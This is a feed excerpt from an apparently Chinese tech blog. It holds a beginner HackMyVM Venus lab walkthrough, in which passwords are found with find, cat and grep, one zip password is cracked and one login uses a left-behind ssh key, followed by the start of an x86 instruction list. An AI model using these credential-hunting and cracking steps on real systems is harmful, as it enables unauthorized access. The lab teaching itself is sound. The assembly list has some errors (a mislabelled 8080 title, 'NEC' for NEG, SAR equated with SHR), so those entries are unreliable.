number\">2022</span>-04-02 <span class=\"token number\">18</span>:50<span class=\"token punctuation\">)</span> <span class=\"token number\">25</span>.00g/s 204800p/s 204800c/s 204800C/s <span class=\"token number\">123456</span><span class=\"token punctuation\">..</span>whitetiger</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Use the <span class=\"token string\">\"--show\"</span> option to display all of the cracked passwords reliably</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Session completed</pre></td></tr></table></figure><p>zip 存档的密码是 pass123—— 我们现在可以解压存档并输出密码：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">unzip</span> protected.zip </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Archive:  protected.zip</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span>protected.zip<span class=\"token punctuation\">]</span> pwned/clara/protected.txt password:</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> extracting: pwned/clara/protected.txt</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">cat</span> pwned/clara/protected.txt</pre></td></tr></table></figure><h2 id=\"0x19\"><a class=\"anchor\" href=\"#0x19\">#</a> 0x19</h2>\n<blockquote>\n<p>Mission: The password of eliza is the only string that is repeated (unsorted) in repeated.txt.</p>\n</blockquote>\n<p>可以使用单个命令再次解决此级别。密码是在指定文件中多次出现的字符串。要过滤掉它，我们可以使用 <code>uniq</code>  带有 -d 选项的命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">uniq</span> <span class=\"token parameter variable\">-d</span> repeated.txt</pre></td></tr></table></figure><h2 id=\"0x20\"><a class=\"anchor\" href=\"#0x20\">#</a> 0x20</h2>\n<blockquote>\n<p>MIssion: The user iris has left me her key.</p>\n</blockquote>\n<p>在这个级别，用户  <code>iris</code>  好心地留下了一个 ssh-key。<br />\n所以首先显示所有文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>total <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x---  <span class=\"token number\">2</span> root  eliza <span class=\"token number\">4096</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:48 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">55</span> root  root  <span class=\"token number\">4096</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:47 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r--  <span class=\"token number\">1</span> eliza eliza  <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r--  <span class=\"token number\">1</span> eliza eliza <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r-----  <span class=\"token number\">1</span> root  eliza <span class=\"token number\">2602</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:48 .iris_key</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r--r--  <span class=\"token number\">1</span> eliza eliza  <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r-----  <span class=\"token number\">1</span> root  eliza   <span class=\"token number\">31</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:47 flagz.txt</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r-----  <span class=\"token number\">1</span> root  eliza  <span class=\"token number\">143</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:47 mission.txt</pre></td></tr></table></figure><p>文件 &quot;.iris_key&quot; 看起来很有希望：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-i</span> .iris_key iris@localhost</pre></td></tr></table></figure>",
            "tags": [
                "Linux",
                "CTF",
                "打靶",
                "hackMyVM"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/11/08/hackmyvm-venus-walkthrough-1-5/",
            "url": "http://zhyzhyzhy.cn/2022/11/08/hackmyvm-venus-walkthrough-1-5/",
            "title": "HackMyVM Venus Walkthrough 1/5",
            "date_published": "2022-11-07T16:00:00.000Z",
            "content_html": "<h1 id=\"hackmyvm-venus-walkthrough-15\"><a class=\"anchor\" href=\"#hackmyvm-venus-walkthrough-15\">#</a> HackMyVM Venus Walkthrough 1/5</h1>\n<p>上篇已经介绍过了 HackMyVM 平台，那么让我们开始进行 LAB 吧</p>\n<p>HackMyVM 的 Venus Lab 面向对 Linux 控制台没有太多经验的初学者。但是，对于该领域的绝对新手来说，还有一些任务可能有点棘手。</p>\n<h2 id=\"0x01\"><a class=\"anchor\" href=\"#0x01\">#</a> 0x01</h2>\n<blockquote>\n<p>Mission: User sophia has saved her password in a hidden file in this folder. Find it and log in as sophia.</p>\n</blockquote>\n<p>为了显示目录中的所有文件，Linux 提供了 <code>ls</code>  命令。但是，此命令默认不显示隐藏文件。但是，如果使用 -a 选项调用该命令，也会显示隐藏文件。-l 选项将结果打印为列表。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x---  <span class=\"token number\">2</span> root   hacker <span class=\"token number\">4096</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:50 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">55</span> root   root   <span class=\"token number\">4096</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:47 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r-----  <span class=\"token number\">1</span> root   hacker   <span class=\"token number\">31</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:50 <span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r--  <span class=\"token number\">1</span> hacker hacker  <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r--  <span class=\"token number\">1</span> hacker hacker <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r-----  <span class=\"token number\">1</span> root   hacker   <span class=\"token number\">16</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:47 .myhiddenpazz</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r--r--  <span class=\"token number\">1</span> hacker hacker  <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r-----  <span class=\"token number\">1</span> root   hacker  <span class=\"token number\">287</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:47 mission.txt</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>-rw-r-----  <span class=\"token number\">1</span> root   hacker <span class=\"token number\">2542</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:47 readme.txt</pre></td></tr></table></figure><p>现在，当前目录中的所有文件都在此处列出。开头带点的文件是隐藏文件，不带 -a 的 ls 不会出现。</p>\n<p>现在要显示文件 &quot;.myhiddenpazz&quot; 的内容，我们使用 <code>cat</code>  命令。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> .myhiddenpazz</pre></td></tr></table></figure><p>这里我们有用户 &quot;sophia&quot; 的密码。<br />\n要更改用户，只需使用 <code>su</code>  命令后跟要更改的用户名。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">su</span> sophia</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Password:</pre></td></tr></table></figure><p>系统将提示您输入所需用户的密码。如果一切正常，您将以所需用户身份登录，并且可以使用 <code>cd ~</code> . 在这里你会找到一个名为 &quot;flagz.txt&quot; 的文件，你可以在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrbXl2bS5ldS92ZW51cy9mbGFnei5waHA=\"> https://hackmyvm.eu/venus/flagz.php</span> 输入 flag. 然后，您可以在当前主目录的 &quot;mission.txt&quot; 文件中找到下一级的任务描述。</p>\n<p>此外，用户 hacker 的主目录中还有另一个隐藏文件。记住隐藏文件以点开头...... 在该文件中，您会发现一个额外的隐藏标志，您可以在 <span class=\"exturl\" data-url=\"aHR0cDovL2hhY2tteXZtLmV1\">hackmyvm.eu</span> 的 &quot;flagz&quot; 一侧输入它！</p>\n<p>我已经比较详细地描述了第一级。以下级别中简化此问题。如果有任何不清楚的地方，可以使用评论功能向我指出。</p>\n<h2 id=\"0x02\"><a class=\"anchor\" href=\"#0x02\">#</a> 0x02</h2>\n<blockquote>\n<p>Mission: The user angela has saved her password in a file but she does not remember where … she only remembers that the file was called whereismypazz.txt</p>\n</blockquote>\n<p>正如任务文本提到的，我们需要找到一个文件 &quot;whereismypazz.txt&quot;。为此，我们有 <code>find</code>  命令。这有一些有用的选项。这里我们使用 -name 选项。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-name</span> <span class=\"token string\">\"whereismypazz.txt\"</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/usr/share/whereismypazz.txt</pre></td></tr></table></figure><p>第一个 &quot;/&quot; 指定从头开始搜索的位置，即在根目录中。 <code>-name</code>  选项是不言自明的，'2&gt;/dev/null' 用于抑制可能的错误消息。2 是标准错误输出，使用 &gt; 重定向到 /dev/null。</p>\n<p>现在您有了包含下一个用户密码的文件。</p>\n<h2 id=\"0x03\"><a class=\"anchor\" href=\"#0x03\">#</a> 0x03</h2>\n<blockquote>\n<p>Mission: The password of the user emma is in line 4069 of the file findme.txt</p>\n</blockquote>\n<p>这里我们使用 <code>sed</code>  命令打印文件 'findme.txt' 的第 4069 行。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'4069p'</span> findme.txt</pre></td></tr></table></figure><p>你有下一个密码。</p>\n<h2 id=\"0x04\"><a class=\"anchor\" href=\"#0x04\">#</a> 0x04</h2>\n<blockquote>\n<p>Mission: User mia has left her password in the file -.</p>\n</blockquote>\n<p>由于我们不能将文件名 &quot;-&quot; 传递给 <code>cat</code>  命令，因为选项以 &quot;-&quot; 为前缀，因此  <code>cat</code>  无法识别此名称，我们必须稍微欺骗一下。我们只是告诉 cat 在当前目录中查找文件。我们可以通过在文件名前加上字符串 './' 来做到这一点。所以完整的命令是</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> ./-</pre></td></tr></table></figure><h2 id=\"0x05\"><a class=\"anchor\" href=\"#0x05\">#</a> 0x05</h2>\n<blockquote>\n<p>Mission: It seems that the user camila has left her password inside a folder called hereiam</p>\n</blockquote>\n<p>在这里，我们可以将 0x01 的方法与 0x02 的方法结合使用：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-name</span> <span class=\"token string\">\"hereiam\"</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/opt/hereiam</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span> /opt/hereiam</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>total <span class=\"token number\">12</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>drwxr-xr-x <span class=\"token number\">2</span> root root <span class=\"token number\">4096</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:47 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root root <span class=\"token number\">4096</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:47 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root root   <span class=\"token number\">16</span> Feb <span class=\"token number\">24</span> <span class=\"token number\">11</span>:47 .here</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">cat</span> /opt/hereiam/.here</pre></td></tr></table></figure><h2 id=\"0x06\"><a class=\"anchor\" href=\"#0x06\">#</a> 0x06</h2>\n<blockquote>\n<p>Mission: The user luna has left her password in a file inside the muack folder.</p>\n</blockquote>\n<p>我们可以再次使用该 <code>find</code>  命令。但是，这一次使用选项 &quot;-type f&quot; 显式搜索文件并且不输出目录。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> ./muack <span class=\"token parameter variable\">-type</span> f</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>./muack/111/111/muack</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">cat</span> ./muack/111/111/muack</pre></td></tr></table></figure><h2 id=\"0x07\"><a class=\"anchor\" href=\"#0x07\">#</a> 0x07</h2>\n<blockquote>\n<p>Mission: The user eleanor has left her password in a file that occupies 6969 bytes.</p>\n</blockquote>\n<p>我们可以再次使用该 <code>find</code>  命令。这次使用选项 &quot;-size&quot;，我们在文件大小后附加一个 &quot;c&quot;，否则 find 将搜索 6969 个块而不是 6969 个字节。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-size</span> 6969c <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/usr/share/man/man1/h2xs.1.gz</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>/usr/share/moon.txt</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">cat</span> /usr/share/moon.txt</pre></td></tr></table></figure><p><code>find</code>  找到了两个对应大小的文件。由于我们不假设密码文件被压缩，我们首先尝试输出 &quot;.txt&quot; 文件的内容，从而获取下一个用户的密码。</p>\n<h2 id=\"0x08\"><a class=\"anchor\" href=\"#0x08\">#</a> 0x08</h2>\n<blockquote>\n<p>Mission: The user victoria has left her password in a file in which the owner is the user violin.</p>\n</blockquote>\n<p>再次是该 <code>find</code>  命令的用例。这次使用 -user 选项</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-user</span> violin <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/usr/local/games/yo</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">cat</span> /usr/local/games/yo</pre></td></tr></table></figure><h2 id=\"0x09\"><a class=\"anchor\" href=\"#0x09\">#</a> 0x09</h2>\n<blockquote>\n<p>Mission: The user isla has left her password in a zip file.</p>\n</blockquote>\n<p>要解压缩 zip 文件，我们需要对目标具有写权限。由于我们在当前主目录中没有写入权限，因此我们在 &quot;/tmp&quot; 文件夹中创建了一个临时文件夹。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> /tmp/1234</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">unzip</span> passw0rd.zip <span class=\"token parameter variable\">-d</span> /tmp/1234</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Archive:  passw0rd.zip</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> extracting: /tmp/1234/pwned/victoria/passw0rd.txt  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">cat</span> /tmp/1234/pwned/victoria/passw0rd.txt</pre></td></tr></table></figure><h2 id=\"0x10\"><a class=\"anchor\" href=\"#0x10\">#</a> 0x10</h2>\n<blockquote>\n<p>MIssion: The password of the user violet is in the line that begins with a9HFX (these 5 characters are not part of her password.).</p>\n</blockquote>\n<p>在这里，一个新的非常重要的命令开始发挥作用， <code>grep</code>  命令。这用于搜索某些字符串或正则表达式。这里我们也使用正则表达式。我们正在寻找以 &quot;a9HFX&quot; 开头的字符串。为此，我们使用 ^ 字符，它标志着字符串的开始。我们还使用 | 字符将命令的输出重定向（又名 &quot;管道&quot;）到 cat 命令的输入 grep。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> passy <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> ^a9HFX</pre></td></tr></table></figure><p>确保密码在搜索字符串之后开始。</p>\n",
            "tags": [
                "Linux",
                "CTF",
                "打靶",
                "hackMyVM"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/31/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%8C%87%E4%BB%A4%E9%9B%86/",
            "url": "http://zhyzhyzhy.cn/2022/10/31/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%8C%87%E4%BB%A4%E9%9B%86/",
            "title": "汇编语言指令集",
            "date_published": "2022-10-30T17:00:00.000Z",
            "content_html": "<h1 id=\"汇编语言指令集\"><a class=\"anchor\" href=\"#汇编语言指令集\">#</a> 汇编语言指令集</h1>\n<figure class=\"highlight plain\"><figcaption data-lang=\"plain\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>8080汇编手册数据传输指令</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>──────────────────────────────</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>1。 通用数据传送指令。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>MOV 传送字或字节。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>MOVSX 先符号扩展，再传送。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>MOVZX 先零扩展，再传送。</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>PUSH 把字压入堆栈。</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>POP 把字弹出堆栈。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>PUSHA 把AX，CX，DX，BX，SP，BP，SI，DI依次压入堆栈。</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>POPA 把DI，SI，BP，SP，BX，DX，CX，AX依次弹出堆栈。</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>PUSHAD 把EAX，ECX，EDX，EBX，ESP，EBP，ESI，EDI依次压入堆栈。</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>POPAD 把EDI，ESI，EBP，ESP，EBX，EDX，ECX，EAX依次弹出堆栈。</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>BSWAP 交换32位寄存器里字节的顺序</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>XCHG 交换字或字节。( 至少有一个操作数为寄存器，段寄存器不可作为操作数)</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>CMPXCHG 比较并交换操作数。( 第二个操作数必须为累加器AL/AX/EAX )</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>XADD 先交换再累加。( 结果在第一个操作数里 )</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>XLAT 字节查表转换。</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>── BX 指向一张 256 字节的表的起点， AL 为表的索引值 (0-255，即</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>0-FFH); 返回 AL 为查表结果。 ( [BX+AL]->AL )</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>2。 输入输出端口传送指令。</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>IN I/O端口输入。 ( 语法: IN 累加器， &#123;端口号│DX&#125; )</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>OUT I/O端口输出。 ( 语法: OUT &#123;端口号│DX&#125;，累加器 )</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>输入输出端口由立即方式指定时， 其范围是 0-255; 由寄存器 DX 指定时，</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>其范围是 0-65535。</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>3。 目的地址传送指令。</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>LEA 装入有效地址。</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>例: LEA DX，string ;把偏移地址存到DX。</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>LDS 传送目标指针，把指针内容装入DS。</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>例: LDS SI，string ;把段地址:偏移地址存到DS:SI。</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>LES 传送目标指针，把指针内容装入ES。</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>例: LES DI，string ;把段地址:偏移地址存到ES:DI。</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>LFS 传送目标指针，把指针内容装入FS。</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>例: LFS DI，string ;把段地址:偏移地址存到FS:DI。</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>LGS 传送目标指针，把指针内容装入GS。</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>例: LGS DI，string ;把段地址:偏移地址存到GS:DI。</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>LSS 传送目标指针，把指针内容装入SS。</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>例: LSS DI，string ;把段地址:偏移地址存到SS:DI。</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>4。 标志传送指令。</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>LAHF 标志寄存器传送，把标志装入AH。</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>SAHF 标志寄存器传送，把AH内容装入标志寄存器。</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>PUSHF 标志入栈。</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>POPF 标志出栈。</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>PUSHD 32位标志入栈。</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>POPD 32位标志出栈。</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>二、算术运算指令</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>──────────────────────────────</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>ADD 加法。</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>ADC 带进位加法。</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>INC 加 1。</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>AAA 加法的ASCII码调整。</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>DAA 加法的十进制调整。</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>SUB 减法。</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>SBB 带借位减法。</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>DEC 减 1。</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>NEC 求反(以 0 减之)。</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>CMP 比较。(两操作数作减法，仅修改标志位，不回送结果)。</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>AAS 减法的ASCII码调整。</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>DAS 减法的十进制调整。</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>MUL 无符号乘法。</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>IMUL 整数乘法。</pre></td></tr><tr><td data-num=\"62\"></td><td><pre>以上两条，结果回送AH和AL(字节运算)，或DX和AX(字运算)，</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>AAM 乘法的ASCII码调整。</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>DIV 无符号除法。</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>IDIV 整数除法。</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>以上两条，结果回送:</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>商回送AL，余数回送AH， (字节运算);</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>或 商回送AX，余数回送DX， (字运算)。</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>AAD 除法的ASCII码调整。</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>CBW 字节转换为字。 (把AL中字节的符号扩展到AH中去)</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>CWD 字转换为双字。 (把AX中的字的符号扩展到DX中去)</pre></td></tr><tr><td data-num=\"72\"></td><td><pre>CWDE 字转换为双字。 (把AX中的字符号扩展到EAX中去)</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>CDQ 双字扩展。 (把EAX中的字的符号扩展到EDX中去)</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>三、逻辑运算指令</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>────────────────────────────</pre></td></tr><tr><td data-num=\"76\"></td><td><pre>AND 与运算。</pre></td></tr><tr><td data-num=\"77\"></td><td><pre>OR 或运算。</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>XOR 异或运算。</pre></td></tr><tr><td data-num=\"79\"></td><td><pre>NOT 取反。</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>TEST 测试。(两操作数作与运算，仅修改标志位，不回送结果)。</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>SHL 逻辑左移。</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>SAL 算术左移。(=SHL)</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>SHR 逻辑右移。</pre></td></tr><tr><td data-num=\"84\"></td><td><pre>SAR 算术右移。(=SHR)</pre></td></tr><tr><td data-num=\"85\"></td><td><pre>ROL 循环左移。</pre></td></tr><tr><td data-num=\"86\"></td><td><pre>ROR 循环右移。</pre></td></tr><tr><td data-num=\"87\"></td><td><pre>RCL 通过进位的循环左移。</pre></td></tr><tr><td data-num=\"88\"></td><td><pre>RCR 通过进位的循环右移。</pre></td></tr><tr><td data-num=\"89\"></td><td><pre>以上八种移位指令，其移位次数可达255次。</pre></td></tr><tr><td data-num=\"90\"></td><td><pre>移位一次时， 可直接用操作码。 如 SHL AX，1。</pre></td></tr><tr><td data-num=\"91\"></td><td><pre>移位>1次时， 则由寄存器CL给出移位次数。</pre></td></tr><tr><td data-num=\"92\"></td><td><pre>如 MOV CL，04</pre></td></tr><tr><td data-num=\"93\"></td><td><pre>SHL AX，CL</pre></td></tr><tr><td data-num=\"94\"></td><td><pre>四、串指令</pre></td></tr><tr><td data-num=\"95\"></td><td><pre>───────────────────────────</pre></td></tr><tr><td data-num=\"96\"></td><td><pre>DS:SI 源串段寄存器 :源串变址。</pre></td></tr><tr><td data-num=\"97\"></td><td><pre>ES:DI 目标串段寄存器:目标串变址。</pre></td></tr><tr><td data-num=\"98\"></td><td><pre>CX 重复次数计数器。</pre></td></tr><tr><td data-num=\"99\"></td><td><pre>AL/AX 扫描值。</pre></td></tr><tr><td data-num=\"100\"></td><td><pre>D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量。</pre></td></tr><tr><td data-num=\"101\"></td><td><pre>Z标志 用来控制扫描或比较操作的结束。</pre></td></tr><tr><td data-num=\"102\"></td><td><pre>MOVS 串传送。</pre></td></tr><tr><td data-num=\"103\"></td><td><pre>( MOVSB 传送字符。 MOVSW 传送字。 MOVSD 传送双字。 )</pre></td></tr><tr><td data-num=\"104\"></td><td><pre>CMPS 串比较。</pre></td></tr><tr><td data-num=\"105\"></td><td><pre>( CMPSB 比较字符。 CMPSW 比较字。 )</pre></td></tr><tr><td 